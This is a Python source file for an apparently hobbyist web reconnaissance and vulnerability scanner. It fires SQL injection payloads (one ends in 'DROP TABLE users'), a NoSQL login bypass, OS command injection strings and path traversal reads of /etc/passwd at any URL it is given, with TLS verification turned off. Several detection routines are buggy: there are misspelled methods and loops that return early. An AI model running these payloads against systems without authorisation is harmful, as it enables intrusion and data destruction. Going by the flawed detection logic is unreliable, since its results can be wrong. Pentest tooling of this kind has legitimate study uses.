from dotenv import load_dotenv
from Wappalyzer import Wappalyzer, WebPage
import requests
import json
import os

load_dotenv()


class IPScanner(object):
    def __init__(self):
        self.WHOISXML_KEY = os.getenv("whoisxml_api_key")
        self.WHOIS_URL = f"https://www.whoisxmlapi.com/whoisserver/WhoisService?apiKey={self.WHOISXML_KEY}&domainName="
        self.DNSL_URL = f"https://www.whoisxmlapi.com/whoisserver/DNSService?apiKey={self.WHOISXML_KEY}&domainName="
        self.IPG_URL = f"https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey={self.WHOISXML_KEY}&ipAddress="
        self.SDOMAIN_URL = f"https://reverse-dns.whoisxmlapi.com/api/v1"

    def whois_lookup(self, domain: str):
        headers = {
            "Accept": "application/json"
        }
        req = requests.get(f"{self.WHOIS_URL}{domain}&outputFormat=JSON", headers=headers)
        res = req.json()

        return res

    def dns_lookup(self, domain: str):
        headers = {
            "Accept": "application/json"
        }
        req = requests.get(f"{self.DNSL_URL}{domain}&outputFormat=JSON", headers=headers)
        res = req.json()

        return res

    def ipgeo_lookup(self, ip: str):
        headers = {
            "Accept": "application/json"
        }
        req = requests.get(f"{self.IPG_URL}{ip}&outputFormat=JSON", headers=headers)
        res = req.json()

        return res

    def subdomain_lookup(self, domain: str):
        headers = {
            "Accept": "application/json"
        }
        data = json.dumps({
            "apiKey": self.WHOISXML_KEY,
            "outputFormat": "JSON",
            "domains": {
                "include": [
                    domain
                ]
            }
        })
        req = requests.post(self.SDOMAIN_URL, headers=headers, data=data)

        res = req.json()

        return res


class WebScanner(object):
    def __init__(self):
        self.__author__ = "tahaafarooq"
        self.found_directories = []
        self.stacks = []

    def scan_directory(self, url: str, wordlist: str):
        with open(wordlist, "r") as file:
            directories = file.read().splitlines()

        for directory in directories:
            full_url = f"{url}/{directory}"
            res = requests.get(full_url, verify=False)
            if res.status_code == 200:
                self.found_directories.append(directory)
                print(f"[+] Directory Found: {full_url} [-]")
            else:
                print(f"[-] Directory Not Found: {full_url} [-]")

        return self.found_directories

    # def get_tech_stacks(self, url: str):
    #     apps, errors = wappalyzer.detect(url)
    #     if not errors:
    #         for app in apps:
    #             data = {
    #                 "Techonology": app['name'],
    #                 "Categories": f"{', '.join(app['categories'])}",
    #                 "Versions": f"{', '.join(app['versions'])}"
    #             }
    #             self.stacks.append(data)
    #         return self.statcks
    #     else:
    #         return "Not Found"

    def get_technology_stacks(self, url: str):
        webpage = WebPage.new_from_url(url)
        wappalyzer = Wappalyzer.latest()
        result = wappalyzer.analyze_with_versions_and_categories(webpage)

        return result


class VulnScanner(object):
    def __init__(self):
        self.__author__ = "tahaafarooq"
        self.sqli_auth_wordlist = "sqli_auth_bypass.txt"

    """
    OWASP 10 : INJECTION
    The functions below here are only based on injection based vulnerabilities!
    """

    # The URL that is passed in the sqli_url_based should contain a query that takes input, which is to be tested
    # for example, https://tahaafarooq.pew/index.php?id=
    def sqli_url_based(self, url: str):
        payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "1' OR '1'='1' #",
            "1' OR '1'='1' ; DROP TABLE users --"
        ]
        success_payload = []
        failed_payload = []
        for payload in payloads:
            try:
                url_to_test = f"{url}{payload}"
                response = requests.get(url_to_test, verify=False)

                if "error" in response.text:
                    success_payload.append(payload)
                else:
                    failed_payload.append(payload)
            except requests.exceptions.RequestException as RE:
                print(f"Error Occurred! : {RE}")

        if len(success_payload) > 0 and len(failed_payload) < 5:
            return json.dumps({"SQL Injection": True, "Payloads": success_payload})
        else:
            return json.dumps({"SQL Injection": False})

    # inp_a and inp_b respectively should carry the field names of the username and password
    def sqli_form_based(self, url: str, inp_a: str, inp_b: str):
        with open(self.sqli_auth_wordlist, "r") as wordlist:
            payloads = wordlist.read().splitlines()

        for payload in payloads:
            data = {
                inp_a: payload,
                inp_b: "testing"
            }
            try:
                response = requests.post(url, data=data, allow_redirects=True, verify=False)

                if response.is_redirect:
                    return json.dumps({"SQL Injection": True})
                else:
                    return json.dumps({"SQL Injection": False})
            except requests.exceptions.RequestException as e:
                print(e)

    # inp_a and inp_b respectively should carry the field names of the username and password
    def nosqli_form_based(self, url: str, inp_a: str, inp_b: str):
        payload = {
            inp_a: 'admin',
            inp_b: {'$ne': 'testing'}
        }
        response = requests.post(url, json=payload, verify=False)

        if response.status_code == 200 and 'Authentication successful' in response.text:
            return json.dumps({"NOSQL Injection": True})
        else:
            return json.dumps({"NOSQL Injection": False})

    # The URL should contain a parameter for the input to be passed.
    # For example, https://tahaafarooq.dev/output.php?ping=
    def osi_url_based(self, url: str):
        payloads = [
            "; echo 'aGVsbG8K'|base64 -d;",
            "\necho 'aGVsbG8K'|base64 -d;",
            "@(1000+337)",
            "system('echo aGVsbG8K|base64 -d')",
            "echo 'pewpewpew'"
        ]

        outputs = [
            'hello',
            '1337',
            'pewpewpew',
        ]

        success_payloads = []

        for payload in payloads:
            response = requests.post(f"{url}{payload}")
            for output in outputs:
                if output in response.text:
                    success_payloads.append(payload)
                else:
                    return json.dumps({"OS Command Injection": False})

        return json.dumps({"OS Command Injection": True, "Payload": success_payloads})

    # provide with a URL that contains parameter input area for the payload
    # such as https://tahaafarooq.dev/index.php?page=
    def lfi_url_based(self, url: str):
        payloads = [
            "../../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd%00",
            "....//....//....//....//etc/passwd",
            "..///////..////..//////etc/passwd",
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
        ]

        success_payloads = []

        for payload in payloads:
            response = requests.get(f"{url}{payload}")
            if '/bin/bash' in response.text:
                success_payloads.apend(payload)
            else:
                return json.dumps({"LFI": False})

        return json.dumps({"LFI": success_payloads})
